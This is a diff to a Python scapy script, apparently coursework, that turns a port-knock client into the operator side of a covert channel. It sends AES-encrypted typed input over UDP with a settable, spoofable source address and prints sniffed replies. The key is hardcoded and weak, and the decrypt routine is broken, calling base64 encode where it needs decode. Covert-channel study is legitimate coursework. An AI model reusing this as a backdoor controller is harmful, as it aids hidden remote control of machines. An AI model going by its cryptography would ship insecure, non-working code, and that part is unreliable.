@@ -1,16 +1,30 @@
 #!/usr/bin/python
 
-import sys, os, argparse, socket, logging
+import sys, os, argparse, socket, logging, base64
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
+from Crypto.Cipher import AES
 
-def remoteExecute(pkt):
-	return
+SECRET_KEY = '0123456789abcdef'
+
+def AesEncrypt(plainText):
+	cipher = AES.new(SECRET_KEY)
+	paddedPlainText = str(plainText) + (((AES.block_size - len(str(plainText))) % AES.block_size) *"\0")
+	cipherTxt = base64.b64encode(cipher.encrypt(paddedPlainText))
+	return cipherTxt
+
+def AesDecrypt(cipherTxt):
+	secret = AES.new(SECRET_KEY)
+	plainText = secret.decrypt(base64.b64encode(cipherTxt))
+	unpaddedPlainText = plainText.rstrip("\0")
+	return unpaddedPlainText
 
 def stopfilter(pkt):
 	if ARP in pkt:
 		return False
-	return True
+	if Raw in pkt and UDP in pkt:
+		print pkt['Raw'].load
+		return True
 
 def main():
 	cmdParser = argparse.ArgumentParser(description="8505A3-PortKnock Client")
@@ -22,9 +36,9 @@ def main():
 
 	while 1:
 		payload = raw_input("Some input please: ")
-		pkt = IP(dst=args.dstIp, src=args.srcIp)/UDP(dport=int(args.dstPort), sport=random.randint(25089, 49151))/payload
+		pkt = IP(dst=args.dstIp, src=args.srcIp)/UDP(dport=int(args.dstPort), sport=8000)/AesEncrypt(payload)
 		send(pkt)
-		sniff(filter="udp and (src port " + args.dstPort + " and src " + args.dstIp + ")", prn=remoteExecute, stop_filter=stopfilter)
+		sniff(filter="udp and (src port " + args.dstPort + " and src " + args.dstIp + ")", stop_filter=stopfilter)
 
 if __name__ == '__main__':
 	main()
